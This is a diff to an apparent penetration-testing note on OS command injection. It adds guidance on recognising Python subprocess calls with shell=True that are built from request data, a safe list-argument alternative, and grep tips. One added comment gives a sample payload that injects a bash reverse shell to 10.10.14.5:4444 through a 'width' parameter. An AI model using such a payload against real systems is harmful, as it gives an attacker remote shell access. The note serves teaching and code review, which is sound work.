@@ -10,8 +10,28 @@ User-controlled input is passed unsanitized to a system shell call. The injected
 |---|---|
 | PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen` |
 | Node.js | `child_process.exec`, `child_process.spawn` |
-| Python | `os.system`, `subprocess.call/run/Popen` |
+| Python | `os.system`, `os.popen`, `subprocess.call/run/Popen` (**with `shell=True`**), `eval`/`exec` |
 | C# / .NET | `Process.Start`, `ProcessStartInfo` |
+
+### Recognising the sink in source code (the real signal)
+
+When you can read the code (via LFI, a repo, a leaked `app.py`), the red flag is **not the function name alone** — it's a **shell** invocation whose command string is **built from request data**. In Python specifically:
+
+```python
+# 🚩 VULNERABLE — shell=True + an f-string/format/concat of user input
+width = str(params.get('width'))          # attacker-controlled
+command = f"convert {infile} -crop {width}x{height} {outfile}"
+subprocess.run(command, capture_output=True, shell=True, check=True)   # shell parses ; | $() ` etc.
+#   payload:  width = "100  ; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' #"
+
+# ✅ SAFE — no shell, args passed as a LIST (shell=False is the default)
+subprocess.run(["convert", infile, "-crop", crop_arg, outfile])
+#   the same input is now just an argv element — no shell metacharacters are interpreted
+```
+
+The signal is **`shell=True` paired with `f"..."` / `.format()` / `%` / `+` on request data** — same class as SQL injection, shell syntax instead of SQL. `subprocess.run()` on its own (a list of args, `shell=False`) is safe even with identical user input; PHP `escapeshellarg`/`escapeshellcmd` and Node's `execFile`(vs `exec`) are the equivalents. Grep code review for: `shell=True`, `os.system(`, `os.popen(`, backtick/`$( )` in template strings, and any `exec(`/`eval(`.
+
+> [!tip] Corollary for *reading* an app fast: when six modules import blueprints (`from api_edit import bp_edit`), don't read them top-to-bottom — **grep every source file for the sink signatures above** (and for `render_template_string`, `pickle.loads`, `yaml.load`) to jump straight to the exploitable handler. This is how you find `api_edit.py`'s `apply_visual_transform` without reading all six. See [[Non-PHP Web App Attacks]] and the Flask blueprint-map angle in [[Services/Web Services/Flask|Flask]].
 
 ---
 
@@ -629,5 +649,5 @@ $()
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-30*
+*Updated: 2026-08-14*
 *Model: claude-opus-5*
